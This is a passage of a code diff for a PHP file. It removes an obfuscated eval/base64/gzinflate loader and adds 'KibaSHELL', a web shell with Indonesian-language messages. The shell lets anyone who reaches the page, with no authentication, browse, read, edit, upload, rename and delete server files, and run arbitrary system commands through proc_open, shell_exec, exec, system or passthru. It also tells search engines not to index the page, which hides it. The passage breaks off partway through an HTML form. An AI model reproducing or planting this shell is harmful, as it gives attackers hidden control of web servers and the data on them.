@@ -1,2 +1,495 @@
+<?php
+function x($string) {
+    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
+}
 
-<?= @null; $ULTRA = "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"; @eval(base64_decode(base64_decode("WlhaaGJDaHpkSEpmY205ME1UTW9aM3BwYm1ac1lYUmxLR2Q2YVc1bWJHRjBaU2huZW5WdVkyOXRjSEpsYzNNb1ltRnpaVFkwWDJSbFkyOWtaU2drVlV4VVVrRXBLU2twS1NrNw==")));
+function formatSize($bytes) {
+    if ($bytes >= 1073741824) {
+        return number_format($bytes / 1073741824, 2) . ' GB';
+    } elseif ($bytes >= 1048576) {
+        return number_format($bytes / 1048576, 2) . ' MB';
+    } elseif ($bytes >= 1024) {
+        return number_format($bytes / 1024, 2) . ' KB';
+    } else {
+        return $bytes . ' B';
+    }
+}
+
+function getIcon($path) {
+    return is_dir($path) ? '📁' : '📄';
+}
+
+$currentPath = isset($_GET['d']) ? $_GET['d'] : getcwd();
+if (!is_dir($currentPath)) {
+    $currentPath = getcwd();
+}
+
+if (isset($_POST['upload'])) {
+    $targetFile = $currentPath . DIRECTORY_SEPARATOR . $_FILES['uploaded_file']['name'];
+    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile)) {
+        echo "<script>alert('File berhasil diunggah!');</script>";
+    } else {
+        echo "<script>alert('Gagal mengunggah file!');</script>";
+    }
+}
+
+if (isset($_GET['edit']) && is_file($_GET['edit'])) {
+    $fileToEdit = $_GET['edit'];
+    $fileContent = htmlspecialchars(file_get_contents($fileToEdit));
+    echo "<h3>Edit File: " . basename($fileToEdit) . "</h3>
+    <form method='post'>
+        <textarea name='edited_content' rows='20' style='width:100%;'>$fileContent</textarea><br>
+        <input type='hidden' name='file_path' value='" . htmlspecialchars($fileToEdit, ENT_QUOTES) . "'>
+        <button type='submit' name='save_edit'>💾 Simpan</button>
+    </form>";
+}
+
+if (isset($_POST['save_edit']) && isset($_POST['file_path'])) {
+    file_put_contents($_POST['file_path'], $_POST['edited_content']);
+    echo "<script>alert('File berhasil disimpan!'); window.location.href='?d=" . urlencode(dirname($_POST['file_path'])) . "';</script>";
+    exit;
+}
+
+if (isset($_POST['create_folder'])) {
+    $folderName = $_POST['folder_name'];
+    if ($folderName && mkdir($currentPath . DIRECTORY_SEPARATOR . $folderName)) {
+        echo "<script>alert('Folder berhasil dibuat!');</script>";
+    } else {
+        echo "<script>alert('Gagal membuat folder!');</script>";
+    }
+}
+
+if (isset($_POST['rename'])) {
+    $oldPath = $_POST['rename_path'];
+    $newName = $_POST['new_name'];
+    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
+    if (rename($oldPath, $newPath)) {
+        echo "<script>alert('Nama berhasil diubah!');</script>";
+    } else {
+        echo "<script>alert('Gagal mengubah nama!');</script>";
+    }
+}
+
+if (isset($_POST['delete_path'])) {
+    $deletePath = $_POST['delete_path'];
+    if (is_dir($deletePath)) {
+        rmdir($deletePath);
+    } else {
+        unlink($deletePath);
+    }
+    echo "<script>alert('Berhasil dihapus!');</script>";
+}
+
+if (isset($_GET['view'])) {
+    $viewPath = $_GET['view'];
+    if (is_file($viewPath)) {
+        header('Content-Type: text/plain');
+        readfile($viewPath);
+        exit;
+    }
+}
+
+if (isset($_POST['create_file'])) {
+    $newFileName = $_POST['new_file_name'];
+    $newFileContent = $_POST['new_file_content'];
+    $newFilePath = $currentPath . DIRECTORY_SEPARATOR . $newFileName;
+    if (file_put_contents($newFilePath, $newFileContent)) {
+        echo "<script>alert('File berhasil dibuat!');</script>";
+    } else {
+        echo "<script>alert('Gagal membuat file!');</script>";
+    }
+}
+
+$terminalOutput = '';
+if (isset($_POST['run_command'])) {
+    $command = $_POST['command'];
+    if (function_exists('proc_open')) {
+        $descriptorspec = [
+            0 => ["pipe", "r"],
+            1 => ["pipe", "w"],
+            2 => ["pipe", "w"]
+        ];
+
+        $process = proc_open($command, $descriptorspec, $pipes);
+
+        if (is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+
+            proc_close($process);
+
+            $terminalOutput = htmlspecialchars($output . $error);
+        } else {
+            $terminalOutput = "proc_open tidak dapat digunakan.";
+        }
+    } else {
+        // Fallback
+        if (function_exists('shell_exec')) {
+            $terminalOutput = htmlspecialchars(shell_exec($command));
+        } elseif (function_exists('exec')) {
+            $out = [];
+            exec($command, $out);
+            $terminalOutput = htmlspecialchars(implode("\n", $out));
+        } elseif (function_exists('system')) {
+            ob_start();
+            system($command);
+            $terminalOutput = htmlspecialchars(ob_get_clean());
+        } elseif (function_exists('passthru')) {
+            ob_start();
+            passthru($command);
+            $terminalOutput = htmlspecialchars(ob_get_clean());
+        } else {
+            $terminalOutput = "Tidak ada fungsi eksekusi command yang tersedia.";
+        }
+    }
+}
+
+
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>KibaSHELL</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, nofollow">
+    <meta name="bingbot" content="noindex, nofollow">
+    <meta name="slurp" content="noindex, nofollow">
+    <meta name="yandex" content="noindex, nofollow">
+    <meta name="duckduckbot" content="noindex, nofollow">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://cdnkumana.web.app/img/dragon-ico.webp">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.cdnfonts.com/css/qanelas" rel="stylesheet">
+    <style>
+      body {
+            background-color: #001f3f;
+            color: #ffffff;
+            font-family: 'Qanelas', sans-serif;
+            /* font-style: italic; */
+            font-weight: 500;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .drop {
+            position: absolute;
+            background: linear-gradient(180deg, #ffcc00, #ffcc00);
+            width: 1.5px;
+            height: 20px;
+            opacity: 0.6;
+            transform: rotate(10deg);
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% {
+                transform: translateY(-100px) rotate(10deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.6;
+            }
+            100% {
+                transform: translateY(100vh) rotate(10deg);
+                opacity: 0;
+            }
+        }
+
+        #container {
+            background-color: black;
+            padding: 20px;
+            margin: 10px;
+            border-radius: 10px;
+            max-width: 100%;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        h2 {
+            font-size: 24px;
+            color: #fff;
+        }
+        a {
+            color:rgb(255, 255, 255);
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .actions button {
+            background-color:rgb(255, 255, 255);
+            border: none;
+            color: #001f3f;
+            padding: 5px 10px;
+            margin-right: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .actions button:hover {
+            background-color: #3399ff;
+        }
+        #server-info {
+            margin-top: 30px;
+            background-color: #002b5c;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        #server-info h3 {
+            margin-top: 0;
+            color: #ffcc00;
+        }
+        #server-info table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        #server-info th, #server-info td {
+            border: 1px solid rgb(0, 0, 0);
+            padding: 8px;
+        }
+        .table-wrapper {
+            overflow-y: auto;
+            max-height: 400px;
+            border: 1px solid #444;
+            margin-top: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            table-layout: fixed;
+        }
+        th, td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #444;
+            word-wrap: break-word;
+        }
+        th {
+            background-color: rgb(235, 180, 0);
+            padding: 10px;
+            color: #000;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        tr:nth-child(even) { background-color: #003366; }
+        tr:nth-child(odd) { background-color: #000000; }
+
+        @media (max-width: 768px) {
+            #container {
+                padding: 10px;
+            }
+            h2 {
+                font-size: 18px;
+            }
+            table {
+                font-size: 12px;
+            }
+        }
+
+        #create-file-form {
+            display: none;
+        }
+    </style>
+    <script>
+        function toggleCreateFileForm() {
+            const createFileForm = document.getElementById('create-file-form');
+            createFileForm.style.display = createFileForm.style.display === 'none' ? 'block' : 'none';
+        }
+    </script>
+</head>
+<body>
+<script>
+    function createRain() {
+        const numberOfDrops = 150;
+        for (let i = 0; i < numberOfDrops; i++) {
+            const drop = document.createElement('div');
+            drop.classList.add('drop');
+            drop.style.left = `${Math.random() * 100}vw`;
+            const height = Math.random() * 20 + 10; 
+            drop.style.height = `${height}px`;
+            const duration = Math.random() * 1 + 1.5; 
+            const delay = Math.random() * 2; 
+            drop.style.animationDuration = `${duration}s`;
+            drop.style.animationDelay = `${delay}s`;
+            document.body.appendChild(drop);
+        }
+    }
+    createRain();
+</script>
+<style>
+    .header {
+        text-align: center;
+        padding:  10px 10px 10px; 
+        background-color: #001f3f;
+    }
+
+    .header img {
+        max-width: 250px;
+        height: auto;
+        margin-top: 7px;
+    }
+</style>
+
+<div id="container">
+    <h2>📂 KibaSHELL FILE MANAGER</h2>
+
+<!-- Breadcrumb dan Back Home -->
+<div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; margin-bottom: 15px; font-size: 14px;">
+    <div class="breadcrumb">
+<?php
+echo '<div class="breadcrumb">';
+$breadcrumbs = explode(DIRECTORY_SEPARATOR, $currentPath);
+$breadcrumbPath = '';
+$lastIndex = count($breadcrumbs) - 1;
+
+foreach ($breadcrumbs as $index => $dir) {
+    $breadcrumbPath .= $dir . DIRECTORY_SEPARATOR;
+    echo '<a href="?d=' . urlencode($breadcrumbPath) . '">' . x($dir) . '</a>';
+    if ($index !== $lastIndex) {
+        echo ' / ';
+    }
+}
+echo '</div>';
+?>
+
+
+    </div>
+    <div>
+        <a href="?d=<?= urlencode(realpath('.')) ?>" style="color: #ffcc00; text-decoration: none;">
+            <i class="fa-solid fa-arrow-left"></i> 
+        </a>
+    </div>
+</div>
+
+<div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px;">
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="uploadFile">
+        <button type="submit" name="upload">Upload File</button>
+    </form>
+
+    <form method="post">
+        <input type="text" name="newFolderName" placeholder="New Folder Name">
+        <button type="submit" name="createFolder">Create Folder</button>
+    </form>
+
+    <form method="post">
